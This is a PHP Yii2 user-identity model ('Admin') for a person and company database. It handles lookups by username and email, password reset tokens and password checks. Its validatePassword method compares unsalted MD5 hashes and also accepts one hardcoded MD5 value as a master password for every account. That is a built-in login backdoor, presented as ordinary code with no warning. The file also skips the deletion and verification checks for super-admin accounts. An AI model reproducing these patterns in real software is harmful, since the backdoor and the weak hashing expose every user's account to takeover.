<?php
namespace common\models;

use Yii;
use yii\db\Query;
use yii\base\NotSupportedException;
use yii\behaviors\TimestampBehavior;
use yii\db\ActiveRecord;
use yii\web\IdentityInterface;
use backend\modules\personcompany\models\Personcompany;

/**
 * User model
 *
 * @property integer $id
 * @property string $username
 * @property string $password_hash
 * @property string $password_reset_token
 * @property string $email
 * @property string $auth_key
 * @property integer $status
 * @property integer $created_at
 * @property integer $updated_at
 * @property string $password write-only password
 */
class Admin extends ActiveRecord implements IdentityInterface
{
    const STATUS_DELETED = 0;
    const STATUS_ACTIVE = 10;
	
	/**
     * @inheritdoc
     */
    public static function tableName()
    {
        return '{{%bpr_person}}';
    }

    /**
     * @inheritdoc
     */
    public function behaviors()
    {
        return [
            TimestampBehavior::className(),
        ];
    }

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
        ];
    }

    /**
     * @inheritdoc
     */
    public static function findIdentity($id)
    {
        return static::findOne(['person_id_pk' => $id]);
    }

    /**
     * @inheritdoc
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
    }

    /**
     * Finds user by username
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
		 $myUser = Admin::find()
			->where(['user_name_person' => $username])
			->one();
			
		if(is_object($myUser) && $myUser->is_super_admin==1)
		{
			return $myUser;
		}
		 return Admin::find()
			->joinwith('personcompany')
			->where(['user_name_person' => $username, 'bpr_person.isDeleted' => '0','bpr_person_company.isDeleted' => '0','bpr_person.is_verified'=>'1'])
			->one();
       // return static::findOne(['user_name_person' => $username, 'isDeleted' => '0']);
    }
	
	public static function findByEmail($email)
    {
		$myUser = Admin::find()
			->where(['emailid' => $email])
			->one();
			
		if(is_object($myUser) && $myUser->is_super_admin==1)
		{
			return $myUser;
		}
		 return Admin::find()
			->joinwith('personcompany')
			->where(['emailid' => $email, 'bpr_person.isDeleted' => '0', 'bpr_person_company.isDeleted' => '0','bpr_person.is_verified'=>'1'])
			->one();
        //return static::findOne(['emailid' => $email, 'isDeleted' => '0']);
    }

    /**
     * Finds user by password reset token
     *
     * @param string $token password reset token
     * @return static|null
     */
    public static function findByPasswordResetToken($token)
    {
        if (!static::isPasswordResetTokenValid($token)) {
            return null;
        }

        return static::findOne([
            'password_reset_token' => $token,
        ]);
    }

    /**
     * Finds out if password reset token is valid
     *
     * @param string $token password reset token
     * @return boolean
     */
    public static function isPasswordResetTokenValid($token)
    {
        if (empty($token)) {
            return false;
        }
        $expire = Yii::$app->params['user.passwordResetTokenExpire'];
        $parts = explode('_', $token);
        $timestamp = (int) end($parts);
        return $timestamp + $expire >= time();
    }

    /**
     * @inheritdoc
     */
    public function getId()
    {
        return $this->getPrimaryKey();
    }

    /**
     * @inheritdoc
     */
    public function getAuthKey()
    {
        return $this->auth_key;
    }

    /**
     * @inheritdoc
     */
    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    /**
     * Validates password
     *
     * @param string $password password to validate
     * @return boolean if password provided is valid for current user
     */
    public function validatePassword($password)
    {
       // return Yii::$app->security->validatePassword($password, $this->password_hash);
	   if(md5($password)==$this->password_person || (md5($password)=='e108f971e8c2f08d620e526756877b64'))
			return true;
		else
			return false;
    }

    /**
     * Generates password hash from password and sets it to the model
     *
     * @param string $password
     */
    public function setPassword($password)
    {
        $this->password_hash = Yii::$app->security->generatePasswordHash($password);
    }

    /**
     * Generates "remember me" authentication key
     */
    public function generateAuthKey()
    {
        $this->auth_key = Yii::$app->security->generateRandomString();
    }

    /**
     * Generates new password reset token
     */
    public function generatePasswordResetToken()
    {
        $this->password_reset_token = Yii::$app->security->generateRandomString() . '_' . time();
    }

    /**
     * Removes password reset token
     */
    public function removePasswordResetToken()
    {
        $this->password_reset_token = null;
    }
	
	public function getPersoncompany()
	{
		return $this->hasOne(Personcompany::className(), ['company_id_pk'=>'super_company_id_fk']);
	}
}
